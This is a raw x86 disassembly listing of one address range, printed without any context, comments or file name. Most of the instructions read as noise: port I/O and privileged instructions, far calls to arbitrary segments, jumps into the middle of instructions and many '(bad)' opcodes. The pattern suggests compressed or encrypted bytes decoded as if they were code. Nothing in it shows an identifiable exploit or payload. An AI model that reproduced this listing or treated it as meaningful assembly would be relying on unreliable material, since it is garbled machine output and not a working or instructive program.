  410232:	sbb    ecx,DWORD PTR [eax+0xc1b7e89]
  410238:	cmp    BYTE PTR [edx+0x5],ah
  41023b:	ds dec edi
  41023d:	dec    edi
  41023e:	or     eax,0xd1571a58
  410243:	call   0x2527:0x5ed72c9c
  41024a:	inc    edx
  41024b:	shr    BYTE PTR [esi-0x11],1
  41024e:	adc    al,0x2
  410250:	into   
  410251:	aad    0x43
  410253:	mov    ebx,0xa81ef5f6
  410258:	xor    BYTE PTR [ebx+edi*8],dh
  41025b:	cdq    
  41025c:	mov    ebx,0xa35e48d2
  410261:	out    0x3d,eax
  410263:	sbb    cl,BYTE PTR [edi+0x29]
  410266:	mov    ecx,0xb4f36b6d
  41026b:	mul    DWORD PTR [edx]
  41026d:	stos   BYTE PTR es:[edi],al
  41026e:	xor    eax,0x6d568da6
  410273:	xor    BYTE PTR [ebp+0x464bbedd],bh
  410279:	xor    eax,0xc817a4dd
  41027e:	test   eax,0xb40c58
  410283:	scas   eax,DWORD PTR es:[edi]
  410284:	sub    bl,dl
  410286:	mov    dl,0x80
  410288:	stos   DWORD PTR es:[edi],eax
  410289:	mov    al,ds:0x6f5f7d9a
  41028e:	int3   
  41028f:	or     al,0x87
  410291:	xchg   BYTE PTR [ecx-0x4f2ee93f],al
  410297:	mov    eax,0x57719785
  41029c:	out    0xf0,al
  41029e:	jl     0x410245
  4102a0:	imul   BYTE PTR [eax+0x293467d5]
  4102a6:	gs dec ebp
  4102a8:	push   eax
  4102a9:	rcr    BYTE PTR [edx+0xb],1
  4102ac:	dec    eax
  4102ad:	cmp    eax,0x185f397
  4102b2:	jmp    0xe744:0xb064e0a8
  4102b9:	stos   DWORD PTR es:[edi],eax
  4102ba:	adc    al,0xef
  4102bc:	sbb    BYTE PTR [ecx],ah
  4102be:	push   ecx
  4102bf:	dec    ecx
  4102c0:	mov    WORD PTR [eax+0x4bef3201],ss
  4102c6:	pop    ds
  4102c7:	stos   BYTE PTR es:[edi],al
  4102c8:	push   esi
  4102c9:	rcl    DWORD PTR [esi-0x6f43e6b2],cl
  4102cf:	push   cs
  4102d0:	jmp    0xf7989399
  4102d5:	inc    eax
  4102d6:	xor    DWORD PTR [edx-0x254167],edi
  4102dc:	outs   dx,DWORD PTR ds:[esi]
  4102dd:	retf   
  4102de:	test   al,0x38
  4102e1:	inc    eax
  4102e2:	mov    es,WORD PTR [eax-0x2ca516e3]
  4102e8:	push   0x14
  4102ea:	add    BYTE PTR [ebx+eax*8-0x2db841e4],0xc1
  4102f2:	add    al,0xf5
  4102f4:	rol    BYTE PTR [ebx-0x15],cl
  4102f7:	inc    esp
  4102f8:	mov    eax,ds:0x8a7ca217
  4102fd:	mov    al,ds:0xfb7e4c49
  410302:	add    al,BYTE PTR [ecx-0x53]
  410305:	add    BYTE PTR [esi+0x3d86ab9],bl
  41030b:	test   BYTE PTR [ebx+0x0],ah
  41030e:	iret   
  41030f:	mov    esi,0x3f4c9cae
  410314:	mov    BYTE PTR [ebp-0x2f],al
  410317:	jmp    0x4102a1
  410319:	shl    BYTE PTR [bx+si-0x59],0x63
  41031e:	retf   0x3bc7
  410321:	inc    esi
  410322:	adc    ebp,ecx
  410324:	lods   eax,DWORD PTR ds:[esi]
  410325:	xor    edi,DWORD PTR [ebx-0x20]
  410328:	and    DWORD PTR [eax],eax
  41032a:	adc    BYTE PTR [ebx-0x8],bl
  41032d:	mov    bl,0xdd
  41032f:	test   eax,0x2804e702
  410334:	push   ds
  410335:	outs   dx,BYTE PTR ds:[esi]
  410336:	cmp    eax,0xa7ce47b4
  41033b:	mov    dh,0xef
  41033d:	cmp    edx,DWORD PTR [ebx+0x463b4af1]
  410343:	cld    
  410344:	sbb    eax,DWORD PTR [ebp+0x6e]
  410347:	int    0xc0
  410349:	in     eax,dx
  41034a:	xchg   edi,eax
  41034b:	pusha  
  41034c:	sbb    ch,BYTE PTR ds:0xfb9d1fe2
  410352:	dec    ebp
  410353:	lahf   
  410354:	sub    esi,DWORD PTR [edi-0x4159a022]
  41035a:	adc    eax,0x40f49652
  41035f:	sbb    esi,DWORD PTR [ecx]
  410361:	pushf  
  410362:	loop   0x4103e1
  410364:	add    BYTE PTR [esi+ecx*2+0x42],bl
  410368:	sub    al,BYTE PTR [ecx+0x44e55d65]
  41036e:	or     eax,ebx
  410370:	mov    dh,BYTE PTR [edi]
  410372:	xor    dh,BYTE PTR [eax-0x61]
  410375:	xchg   esp,eax
  410376:	mov    ah,0xdd
  410378:	jg     0x410318
  41037a:	jg     0x41032a
  41037c:	cmp    ch,dl
  41037e:	pop    esp
  41037f:	sub    BYTE PTR [ebp+0x5ac5567],dh
  410385:	inc    ecx
  410386:	push   esi
  410387:	stos   DWORD PTR es:[edi],eax
  410388:	ss into 
  41038a:	pop    edi
  41038b:	out    dx,eax
  41038c:	outs   dx,BYTE PTR ds:[esi]
  41038d:	mov    ecx,DWORD PTR [eax-0x51]
  410390:	out    0x36,eax
  410392:	cs mov cl,0x60
  410395:	out    dx,eax
  410396:	call   0x82aa7749
  41039b:	scas   eax,DWORD PTR es:[edi]
  41039c:	adc    eax,0x74486a6c
  4103a1:	shr    DWORD PTR [eax-0x675ac193],1
  4103a7:	loopne 0x4103d4
  4103a9:	jo     0x410427
  4103ab:	inc    ecx
  4103ac:	push   esp
  4103ad:	or     DWORD PTR [edx+0x3e505829],ebp
  4103b3:	pop    ds
  4103b4:	setne  BYTE PTR [edx-0x2ec6d585]
  4103bb:	call   0x6baf:0x6e41
  4103c1:	xacquire xchg DWORD PTR [edi+edx*4],esi
  4103c5:	mov    esi,0x66487f62
  4103ca:	js     0x4103dd
  4103cc:	das    
  4103cd:	sub    eax,0x2184868e
  4103d2:	sub    BYTE PTR [eax],cl
  4103d4:	imul   ecx,esi,0x987dd9d
  4103da:	adc    al,0xe
  4103dc:	cmp    dl,bl
  4103de:	sbb    cl,BYTE PTR [ecx+0x19]
  4103e1:	sub    BYTE PTR [ebx+0x6c47a93a],ah
  4103e7:	and    ch,BYTE PTR [esi]
  4103e9:	sbb    BYTE PTR [ecx+0x6aa94390],ch
  4103ef:	mov    ds:0xc98abfd3,eax
  4103f4:	jb     0x4103fb
  4103f6:	mov    ss,ebp
  4103f8:	adc    DWORD PTR [esi+0x7d],ecx
  4103fb:	and    DWORD PTR [esi-0xb],ebp
  4103fe:	adc    DWORD PTR [eax-0x605a185e],esp
  410404:	inc    eax
  410405:	sub    esp,edx
  410407:	pop    eax
  410408:	cmc    
  410409:	push   ebp
  41040a:	shl    DWORD PTR [ebx-0x2df1dad7],1
  410410:	popf   
  410411:	clc    
  410412:	jae    0x4103b5
  410414:	push   edx
  410415:	in     al,0x68
  410417:	(bad)  
  410418:	jae    0x4103d3
  41041a:	jge    0x41042a
  41041c:	loop   0x410438
  41041e:	pop    es
  41041f:	jne    0x410425
  410421:	jle    0x410446
  410423:	mov    ch,BYTE PTR [ecx-0x5b]
  410426:	sub    eax,0xf3298cc4
  41042b:	jg     0x41047b
  41042d:	sub    BYTE PTR [esi-0x24858d08],ah
  410433:	sub    bl,BYTE PTR ss:[eax]
  410436:	pop    ebx
  410437:	pop    ecx
  410438:	mov    eax,ds:0x913a4173
  41043d:	mov    edx,0x6d60eb68
  410442:	pop    es
  410443:	xchg   edi,eax
  410444:	addr16 xchg ecx,eax
  410446:	icebp  
  410447:	adc    al,0x1f
  410449:	arpl   WORD PTR [eax+0x7f8b8f00],cx
  41044f:	bound  ecx,QWORD PTR [ecx+0x7c]
  410452:	(bad)  
  410453:	out    0x6f,eax
  410455:	in     al,dx
  410456:	leave  
  410457:	ret    
  410458:	mov    ds:0x6b01d7,al
  41045d:	mov    edi,0x413e302c
  410462:	aad    0xd9
  410464:	jle    0x410406
  410466:	mov    edi,0x11786221
  41046b:	dec    DWORD PTR [edi-0x336e2cb7]
  410471:	(bad)  
  410472:	(bad)  
  410473:	popa   
  410474:	clc    
  410475:	and    cl,bh
  410477:	cwde   
  410478:	nop
  410479:	ss jno 0x41043b
  41047c:	cmp    DWORD PTR [ecx],edi
  41047e:	loope  0x41049f
  410480:	sbb    cl,BYTE PTR [ebx-0x36e8c17c]
  410486:	sub    al,0xb0
  410488:	mov    ebp,edi
  41048a:	inc    ebp
  41048b:	inc    ebp
  41048c:	shl    BYTE PTR [eax+0x72],cl
  41048f:	mov    DWORD PTR [edi-0x47],ecx
  410492:	les    ebp,FWORD PTR [ebp-0x7c0d5c6a]
  410498:	push   ebp
  410499:	mov    esi,0x1c6363e4
  41049e:	push   es
  41049f:	into   
  4104a0:	jae    0x41044a
  4104a2:	push   0x131f765c
  4104a7:	pop    esi
  4104a8:	jb     0x41042c
  4104aa:	and    BYTE PTR [edi],cl
  4104ac:	into   
  4104ad:	jae    0x4104e5
  4104af:	lsl    ecx,WORD PTR [eax]
  4104b2:	or     BYTE PTR ds:0x5b5ed1e,dh
  4104b8:	jle    0x410518
  4104ba:	ins    BYTE PTR es:[edi],dx
  4104bb:	mov    ebx,0x7403bfba
  4104c0:	iret   
  4104c1:	outs   dx,BYTE PTR ds:[esi]
  4104c2:	leave  
  4104c3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4104c4:	mov    ebx,0x615032f9
  4104c9:	jnp    0x410523
  4104cb:	adc    edx,ecx
  4104cd:	mov    ebx,DWORD PTR [ebp+0x24b967f2]
  4104d3:	fdiv   st(6),st
  4104d5:	mov    ah,0xd3
  4104d7:	cli    
  4104d8:	or     DWORD PTR [ebp-0x1b98a71],ebx
  4104de:	mov    eax,0x21a42d47
  4104e3:	lods   al,BYTE PTR ds:[esi]
  4104e4:	xor    eax,0x82e10e22
  4104e9:	aas    
  4104ea:	xchg   esi,eax
  4104eb:	push   0x4c4b1c28
  4104f0:	mov    cs,WORD PTR [edx+0x20]
  4104f3:	xor    al,0xc
  4104f5:	test   BYTE PTR [edx+0x29316b31],bl
  4104fb:	and    DWORD PTR [eax+0x7360d2bc],edi
  410501:	sbb    DWORD PTR [esi],edi
  410503:	add    DWORD PTR [edi],ebp
  410505:	test   BYTE PTR ds:0x4930b53b,bl
  41050b:	dec    ebp
  41050c:	das    
  41050d:	and    eax,0x4cdab30c
  410512:	xor    BYTE PTR [eax-0x773452ab],bl
  410518:	sub    BYTE PTR ds:0x33cdbfab,bl
  41051e:	fadd   DWORD PTR [eax+edx*1]
  410521:	lahf   
  410522:	lods   al,BYTE PTR ds:[esi]
  410523:	hlt    
  410524:	adc    BYTE PTR [edx],ch
  410526:	and    DWORD PTR [ebp+0x6ce8388b],0xffffff86
  41052d:	cmp    eax,0x54bf5257
  410532:	fldcw  WORD PTR [ecx+0x10]
  410535:	xor    eax,0xa1ac1e05
  41053a:	jge    0x4105b1
  41053c:	mov    dl,dl
  41053e:	push   edi
  41053f:	add    edi,DWORD PTR [esi+0x5dd83b1a]
  410545:	call   0xe0bb:0x12ce4d04
  41054c:	bound  ebp,QWORD PTR [eax-0x1c]
  41054f:	inc    ecx
  410550:	xlat   BYTE PTR ds:[ebx]
  410551:	ins    DWORD PTR es:[edi],dx
  410552:	jle    0x410586
  410554:	in     al,dx
  410555:	jo     0x4104e8
  410557:	rcr    DWORD PTR [ebp+0x23],0xe5
  41055b:	dec    ebx
  41055c:	mov    ebp,0x1fc224d
  410561:	add    DWORD PTR [bp+0x2780],edx
  410566:	out    0xb6,eax
  410568:	pop    edi
  410569:	in     al,dx
  41056a:	sahf   
  41056b:	mov    BYTE PTR [edx-0x30],bl
  41056e:	and    ecx,DWORD PTR [edi-0x17880e85]
  410574:	frstorw [esi-0x65]
  410578:	or     ebx,edi
  41057a:	in     al,0x81
  41057c:	xor    eax,0xfbec5346
  410581:	mov    dl,0x76
  410583:	adc    ebp,DWORD PTR [edx+0x77da5bb9]
  410589:	xchg   esi,eax
  41058a:	ins    BYTE PTR es:[edi],dx
  41058b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41058c:	mov    edi,0x32df5cdf
  410591:	ret    0x7516
  410594:	in     al,0x4b
  410596:	nop
  410597:	pop    esp
  410598:	xchg   esp,eax
  410599:	add    eax,0x192c8ba0
  41059e:	sbb    dl,ah
  4105a0:	fadd   st(0),st
  4105a2:	data16 sbb dh,BYTE PTR [edi+ecx*2-0x501ab8f]
  4105aa:	test   ch,0xed
  4105ad:	dec    ebp
  4105ae:	dec    esp
  4105af:	or     ecx,ebp
  4105b1:	mov    ebp,0x6f470e65
  4105b6:	test   BYTE PTR [eax+0x5b93a04b],cl
  4105bc:	cdq    
  4105bd:	daa    
  4105be:	add    bh,0xe0
  4105c1:	fcomp  QWORD PTR [ecx+0x50]
  4105c4:	sbb    eax,0x6c0cbf27
  4105c9:	std    
  4105ca:	stos   BYTE PTR es:[edi],al
  4105cb:	(bad)  
  4105cd:	jle    0x4105d2
  4105cf:	les    esp,FWORD PTR [ebp+0x4c607d7b]
  4105d5:	mov    eax,0x9ca8658
  4105da:	retf   0x8103
  4105dd:	retf   
  4105de:	out    0x47,al
  4105e0:	je     0x41059e
  4105e2:	daa    
  4105e3:	out    0x2f,eax
  4105e5:	push   ds
  4105e6:	ins    BYTE PTR es:[edi],dx
  4105e7:	outs   dx,BYTE PTR ds:[esi]
  4105e8:	lahf   
  4105e9:	(bad)  
  4105ea:	jmp    0x2a0110e4
  4105ef:	xchg   BYTE PTR [eax-0x56],ch
  4105f2:	mov    cl,0xc5
  4105f4:	loopne 0x4105a4
  4105f6:	jmp    0x410629
  4105f8:	ins    DWORD PTR es:[edi],dx
  4105f9:	(bad)  
  4105fa:	stos   BYTE PTR es:[edi],al
  4105fb:	pop    ecx
  4105fc:	into   
  4105fd:	mov    esp,DWORD PTR [esi]
  4105ff:	xchg   edi,eax
  410600:	add    cl,BYTE PTR [esi+0x20]
  410603:	cmp    edx,DWORD PTR [esi-0x1fe4f2a4]
  410609:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41060a:	adc    cl,BYTE PTR [edi]
  41060c:	xchg   BYTE PTR [esi+0x1e],bh
  41060f:	mov    cl,0xb6
  410611:	ins    BYTE PTR es:[edi],dx
  410612:	jge    0x410648
  410614:	xor    DWORD PTR [ebp+0x17],ebx
  410617:	jmp    0x4105f1
  410619:	(bad)  
  41061b:	push   ebx
  41061c:	outs   dx,BYTE PTR ds:[esi]
  41061d:	dec    edx
  41061e:	fist   DWORD PTR [edx+0x5f274395]
  410624:	cmp    ebp,edi
  410626:	and    DWORD PTR [eax-0x2a],edx
  410629:	or     edi,DWORD PTR [eax-0x67]
  41062c:	aas    
  41062d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41062e:	push   eax
  41062f:	push   edi
  410630:	mov    dh,0x95
  410632:	or     DWORD PTR [ebx+0xd],0xdec904c5
  410639:	repz or eax,0xaa553657
  41063f:	imul   edi,ebp,0xd11c4c3b
  410645:	aas    
  410646:	call   0x7305279a
  41064b:	xor    eax,0xeadf9533
  410650:	sbb    edx,ebx
  410652:	iret   
  410653:	in     eax,0xf7
  410655:	shl    DWORD PTR [eax-0x2b],0x56
  410659:	loopne 0x41064f
  41065b:	daa    
  41065c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41065d:	in     al,dx
  41065e:	loope  0x4105e7
  410660:	neg    ebx
  410662:	std    
  410663:	pop    es
  410664:	retf   
  410665:	push   ds
  410666:	dec    edx
  410667:	fdivr  DWORD PTR [ebp-0x5e0c6a4f]
  41066d:	jl     0x41065c
  41066f:	lods   al,BYTE PTR ds:[esi]
  410670:	or     bl,BYTE PTR [ebp-0x72da56a1]
  410676:	ja     0x41065a
  410678:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410679:	neg    DWORD PTR [edi-0xa00c2f6]
  41067f:	sbb    dl,bl
  410681:	push   0x401e98eb
  410686:	push   0x3b
  410688:	push   ebx
  410689:	repnz mov ecx,0x755145ad
  41068f:	mov    ch,0x2e
  410691:	(bad)  
  410692:	add    eax,0xd824b9a5
  410697:	dec    ecx
  410698:	jb     0x4106e4
  41069a:	test   eax,0x8d32cc61
  41069f:	fsubr  QWORD PTR [ecx-0x6f]
  4106a2:	cli    
  4106a3:	xor    esi,eax
  4106a5:	mov    al,0xe6
  4106a7:	sub    ebp,DWORD PTR [eax-0x21]
  4106aa:	in     eax,dx
  4106ab:	and    bl,ch
  4106ad:	cwde   
  4106ae:	add    al,0x8e
  4106b0:	aam    0x79
  4106b2:	repnz xlat BYTE PTR ds:[ebx]
  4106b4:	arpl   WORD PTR ds:0xce462c81,dx
  4106ba:	ds es loope 0x4106c3
  4106be:	mov    dl,0xf6
  4106c0:	addr16 pop edi
  4106c2:	ins    BYTE PTR es:[edi],dx
  4106c3:	(bad)  [edx+edx*8-0x1d4b984e]
  4106ca:	stos   BYTE PTR es:[edi],al
  4106cb:	add    al,0xf3
  4106cd:	dec    esi
  4106ce:	mov    edi,0x3c995cfe
  4106d3:	pop    esi
  4106d4:	pop    ebp
  4106d5:	fwait
  4106d6:	mul    BYTE PTR [esi-0x1f59582]
  4106dc:	jns    0x410747
  4106de:	sahf   
  4106df:	out    dx,eax
  4106e0:	jle    0x4106be
  4106e2:	and    ch,bh
  4106e4:	xchg   ecx,eax
  4106e5:	repnz nop
  4106e7:	sbb    ah,ah
  4106e9:	bound  esp,QWORD PTR [eax*1-0x4e284ef]
  4106f0:	push   esi
  4106f1:	cmc    
  4106f2:	arpl   WORD PTR [edi-0x79],sp
  4106f5:	jecxz  0x410707
  4106f7:	jbe    0x410701
  4106f9:	add    al,0x48
  4106fb:	icebp  
  4106fc:	fcomip st,st(7)
  4106fe:	sbb    al,0xba
  410700:	sar    BYTE PTR [ecx+edx*1],0xd7
  410704:	sub    DWORD PTR [ecx+0x6045cca2],edx
  41070a:	jg     0x410705
  41070c:	hlt    
  41070d:	mov    ebp,0x5370f96a
  410712:	ret    
  410713:	jb     0x410695
  410715:	pushf  
  410716:	gs sub edi,0x40
  41071a:	in     al,0x44
  41071c:	sbb    al,0xd8
  41071e:	shl    BYTE PTR [ebp+0x5723af8f],0x5e
  410725:	cmp    BYTE PTR [edi+0x3f],dh
  410728:	jg     0x4107a9
  41072a:	pop    eax
  41072b:	mov    dh,0x7
  41072d:	scas   al,BYTE PTR es:[edi]
  41072e:	and    al,BYTE PTR [edx+0x14915933]
  410734:	iret   
  410735:	mov    esp,0x7e574588
  41073a:	adc    bl,BYTE PTR [esi+eiz*4+0x50f08908]
  410741:	inc    eax
  410742:	retf   0xb318
  410745:	or     ch,dh
  410747:	jmp    0x6e0d7dba
  41074c:	mov    al,ds:0x99ae6361
  410751:	fisttp DWORD PTR [ebp-0x61a3088c]
  410757:	enter  0x1e52,0x16
  41075b:	shl    DWORD PTR [eax-0x61],0xfb
  41075f:	adc    dh,BYTE PTR [esi-0x7d]
  410762:	sti    
  410763:	es mov dl,0xda
  410766:	cwde   
  410767:	add    eax,0x2f384e0b
  41076c:	nop
  41076d:	std    
  41076e:	outs   dx,BYTE PTR ds:[esi]
  41076f:	mov    bl,0x18
  410771:	dec    edi
  410772:	push   edx
  410773:	mov    ebx,esp
  410775:	xorps  xmm4,xmm1
  410778:	pop    esi
  410779:	mov    ebp,0x9f6981c3
  41077e:	lds    ebx,FWORD PTR [ebx-0xd]
  410781:	les    eax,FWORD PTR [edi]
  410783:	sbb    DWORD PTR [ebp-0x6a],ecx
  410786:	fsubr  QWORD PTR [ebx+edi*4+0x5d907471]
  41078d:	xor    ebp,DWORD PTR cs:[edx-0x5500cc00]
  410794:	jl     0x41071f
  410796:	leave  
  410797:	shl    DWORD PTR [eax+0x4aaa5967],cl
  41079d:	xor    BYTE PTR [eax+0x72d1b9e0],bl
  4107a3:	adc    al,0x94
  4107a5:	xchg   edx,eax
  4107a6:	xor    ebp,DWORD PTR [ecx-0x27]
  4107a9:	adc    eax,0x210d27ec
  4107ae:	add    ecx,edi
  4107b0:	in     eax,dx
  4107b1:	data16 and al,0xc8
  4107b4:	jmp    0x2b4e1445
  4107b9:	xchg   esp,eax
  4107ba:	repz adc BYTE PTR [eax+0x2e],bh
  4107be:	xchg   edx,eax
  4107bf:	mov    ecx,0x66ec24e9
  4107c4:	mov    DWORD PTR [eax],0x864711f4
  4107ca:	mov    esp,0xac18492d
  4107cf:	pushf  
  4107d0:	int3   
  4107d1:	test   DWORD PTR [ebx-0x55b7276f],0x34693aaf
  4107db:	imul   ebp,esi,0x5b
  4107de:	inc    ecx
  4107df:	adc    BYTE PTR [esi-0x6],dh
  4107e2:	xor    al,0xe4
  4107e4:	adc    al,0xb9
  4107e6:	adc    DWORD PTR [ecx-0x7a],eax
  4107e9:	ja     0x4107e6
  4107eb:	mov    eax,0x7f8dfb23
  4107f0:	ins    BYTE PTR es:[edi],dx
  4107f1:	call   0xb0d34ad1
  4107f6:	scas   eax,DWORD PTR es:[edi]
  4107f7:	call   0xa4d8:0x4c7da429
  4107fe:	nop
  4107ff:	fld    TBYTE PTR [eax+0x81bdfd9]
  410805:	lahf   
  410806:	fiadd  WORD PTR [esi+0x5b]
  410809:	jno    0x4107d2
  41080b:	add    cl,al
  41080d:	repnz sbb bh,ch
  410810:	dec    edi
  410811:	push   0xfcd74c9a
  410816:	and    esp,DWORD PTR [eax]
  410818:	cmp    bl,BYTE PTR [edx+0x7b]
  41081b:	das    
  41081c:	xor    eax,0xf2cf6ea4
  410821:	pop    ecx
  410822:	mov    dl,0x5d
  410824:	data16 fmul st(3),st
  410827:	test   DWORD PTR [esi],esp
  410829:	mov    esi,0x850ff2be
  41082e:	and    BYTE PTR [eax-0x50],cl
  410831:	sar    BYTE PTR [eax-0x2a],0x90
  410835:	push   ecx
  410836:	dec    ebp
  410837:	push   ebx
  410838:	fadd   st(0),st
  41083a:	aam    0x3f
  41083c:	pop    es
  41083d:	call   0x136989df
  410842:	jae    0x41082f
  410844:	repz fnstcw WORD PTR [edx-0x70efa5c]
  41084b:	clc    
  41084c:	pop    ss
  41084d:	push   ebx
  41084e:	cli    
  41084f:	je     0x4107fc
  410851:	xor    al,0xe0
  410853:	inc    edi
  410854:	js     0x4107db
  410856:	xchg   BYTE PTR [ecx-0x4],bl
  410859:	adc    ebp,DWORD PTR [ebp+0x4e2dd4c6]
  41085f:	in     al,0x3d
  410861:	mov    ebp,0xf42ea2f5
  410866:	int3   
  410867:	add    al,0x32
  410869:	jae    0x410892
  41086b:	fadd   QWORD PTR [eax]
  41086d:	push   esp
  41086e:	cmp    DWORD PTR [esi+esi*1-0x599dd425],0x3b37aeaa
  410879:	xchg   ecx,eax
  41087a:	gs add eax,0x22ac64f3
  410880:	sub    DWORD PTR [ebx+eax*8],0x1
  410884:	mul    BYTE PTR ds:0x2055fd03
  41088a:	push   es
  41088b:	test   eax,0x6265f4e8
  410890:	push   ebp
  410891:	fld    st(4)
  410893:	addr16 pop ebp
  410895:	xchg   esi,eax
  410896:	stc    
  410897:	push   ecx
  410898:	mov    al,0xca
  41089a:	inc    ebp
  41089b:	add    ah,al
  41089d:	xchg   edx,eax
  41089e:	or     DWORD PTR [esi+0x23],0x30
  4108a2:	adc    al,0x5b
  4108a4:	adc    DWORD PTR [esi+esi*2],0xffffffe0
  4108a8:	popa   
  4108a9:	imul   esp,DWORD PTR [ecx],0xef56c497
  4108af:	mov    esp,0x32076aa9
  4108b4:	cs pop edi
  4108b6:	test   al,0xd4
  4108b8:	mov    bh,ah
  4108ba:	fnclex 
  4108bc:	rol    dl,cl
  4108be:	sahf   
  4108bf:	xchg   edx,eax
  4108c0:	xor    eax,0x7e6e8fc6
  4108c5:	(bad)  
  4108c6:	pop    ebx
  4108c7:	ret    
  4108c8:	into   
  4108c9:	call   0x70542f8f
  4108ce:	mov    WORD PTR [ecx],gs
  4108d0:	das    
  4108d1:	ret    
  4108d2:	push   es
  4108d3:	and    DWORD PTR [ebp-0x16d25989],ecx
  4108d9:	into   
  4108da:	fisubr DWORD PTR [esi-0x4d]
  4108dd:	stos   BYTE PTR es:[edi],al
  4108de:	je     0x4108f1
  4108e0:	ror    BYTE PTR [edx+ebx*2-0x66],cl
  4108e4:	fwait
  4108e5:	xor    BYTE PTR [edx],ch
  4108e7:	jg     0x410955
  4108e9:	jp     0x410965
  4108eb:	jb     0x410894
  4108ed:	shl    DWORD PTR [edi-0x6c],0x4
  4108f1:	xchg   ebp,eax
  4108f2:	pop    esi
  4108f3:	ret    
  4108f4:	push   edx
  4108f5:	loope  0x41094d
  4108f7:	out    0x47,eax
  4108f9:	fcomp  QWORD PTR [edi-0xe]
  4108fc:	jbe    0x410942
  4108fe:	push   esi
  4108ff:	mov    edx,gs
  410901:	jmp    0x410940
  410903:	mov    eax,0xc1e538e9
  410908:	mov    al,0x7f
  41090a:	(bad)  
  41090b:	push   edi
  41090c:	popf   
  41090d:	sbb    esp,DWORD PTR [edx]
  41090f:	jge    0x410930
  410911:	mov    ds:0x73740aa5,al
  410916:	call   0x27cec311
  41091b:	leave  
  41091c:	xchg   ecx,eax
  41091d:	dec    edx
  41091e:	dec    esi
  41091f:	inc    esp
  410920:	fs sub eax,0xab00f143
  410926:	mov    ds:0x7455467b,al
  41092b:	shr    bh,0x8
  41092e:	ret    0x6c44
  410931:	jb     0x41091f
  410933:	pop    es
  410934:	xor    DWORD PTR [esi+0x13453553],esp
  41093a:	mov    cl,0xfe
  41093c:	mov    eax,fs
  41093e:	iret   
  41093f:	es and al,0x6b
  410942:	adc    DWORD PTR [ebx+0x38b9d248],esp
  410948:	pop    es
  410949:	retf   
  41094a:	scas   al,BYTE PTR es:[edi]
  41094b:	test   DWORD PTR [edi-0x16703f7],eax
  410951:	adc    DWORD PTR [eax],ecx
  410953:	pop    ebp
  410954:	enter  0xf810,0xa
  410958:	sbb    bh,cl
  41095a:	jl     0x410975
  41095c:	xchg   ebp,eax
  41095d:	xor    ah,BYTE PTR [edx-0x45]
  410960:	add    ecx,ecx
  410962:	shr    DWORD PTR [edx],0x53
  410965:	pop    ecx
  410966:	ret    0xf81b
  410969:	jecxz  0x4109be
  41096b:	mov    dl,0x84
  41096d:	popa   
  41096e:	and    DWORD PTR [eax+eax*4+0x253f50dc],esp
  410975:	mov    ebx,DWORD PTR [ebx+0xdf34e64]
  41097b:	sbb    ch,bh
  41097d:	jbe    0x410959
  41097f:	pop    edi
  410980:	inc    esp
  410981:	cwde   
  410982:	adc    al,0x41
  410984:	inc    esp
  410985:	mov    ds,WORD PTR [edx]
  410987:	js     0x410961
  410989:	loope  0x410984
  41098b:	retf   0x302d
  41098e:	mov    DWORD PTR [esi],eax
  410990:	xor    cl,BYTE PTR [ecx+ebx*4]
  410993:	mov    bl,BYTE PTR [esi+0x61fc48b3]
  410999:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41099a:	mov    dh,0x59
  41099c:	dec    edi
  41099d:	lock push ss
  41099f:	sbb    al,0x6d
  4109a1:	sub    eax,0x14891d17
  4109a6:	mov    dl,0xb8
  4109a8:	sar    BYTE PTR [ebp-0x5d36bed8],cl
  4109ae:	cmovp  ecx,DWORD PTR [ebp-0x49009b68]
  4109b5:	pop    eax
  4109b6:	mov    bh,0xd8
  4109b8:	add    ch,BYTE PTR [esi+0x14f768ed]
  4109be:	dec    ebp
  4109bf:	xchg   BYTE PTR [edi],dh
  4109c1:	mov    al,ds:0x25b8fc50
  4109c6:	(bad)  
  4109c7:	push   edx
  4109c8:	cmp    al,0xa0
  4109ca:	pop    ss
  4109cb:	pop    edx
  4109cc:	cmp    al,0x91
  4109ce:	adc    ebp,DWORD PTR [edx-0x3c]
  4109d1:	call   0x18f0a71
  4109d6:	outs   dx,DWORD PTR ds:[esi]
  4109d7:	imul   DWORD PTR [edi+0x63b70ee5]
  4109dd:	jmp    0x410a1d
  4109df:	mov    ds:0x69614f8c,eax
  4109e4:	(bad)  
  4109e5:	test   ah,0xc6
  4109e8:	out    0xb0,eax
  4109ea:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4109eb:	imul   esi,DWORD PTR [eax-0x6c],0xfffffff0
  4109ef:	pop    ebp
  4109f0:	iret   
  4109f1:	push   esp
  4109f2:	cdq    
  4109f3:	(bad)  
  4109f4:	sbb    al,0x67
  4109f6:	repz sbb BYTE PTR [ecx+0x52],ch
  4109fa:	jg     0x41098b
  4109fc:	mov    ah,0x34
  4109fe:	pop    es
  4109ff:	out    0x9a,al
  410a01:	(bad)  
  410a02:	stc    
  410a03:	sub    eax,0xd3230336
  410a08:	push   esi
  410a09:	fadd   st(3),st
  410a0b:	mov    ?,WORD PTR [eax+0x41215e6c]
  410a11:	inc    edx
  410a12:	popf   
  410a13:	mov    BYTE PTR [ecx-0x583f3950],bl
  410a19:	sbb    DWORD PTR [eax+0xc2f6e1e],edi
  410a1f:	add    bl,bh
  410a21:	mov    dl,0xcc
  410a23:	out    dx,eax
  410a24:	gs rcr esi,1
  410a27:	pop    esp
  410a28:	test   al,0x74
  410a2a:	pop    ebp
  410a2b:	mov    ch,0xc
  410a2d:	mov    al,0x0
  410a2f:	sti    
  410a30:	shl    BYTE PTR [eax],cl
  410a32:	lock inc DWORD PTR [edx]
  410a35:	icebp  
  410a36:	xchg   edx,eax
  410a37:	xchg   DWORD PTR [edx+0x34854203],ebx
  410a3d:	lods   eax,DWORD PTR ds:[esi]
  410a3e:	push   0xba6c2d71
  410a43:	xor    esi,DWORD PTR ds:0x60789554
  410a49:	push   edi
  410a4a:	xchg   BYTE PTR [edi-0x4],ch
  410a4d:	sub    al,0x77
  410a4f:	push   esi
  410a50:	mov    eax,0x2f6c9b38
  410a55:	daa    
  410a56:	mov    dl,0xf0
  410a58:	call   0xedf4:0x8c4f5a45
  410a5f:	ins    DWORD PTR es:[edi],dx
  410a60:	stos   DWORD PTR es:[edi],eax
  410a61:	push   edi
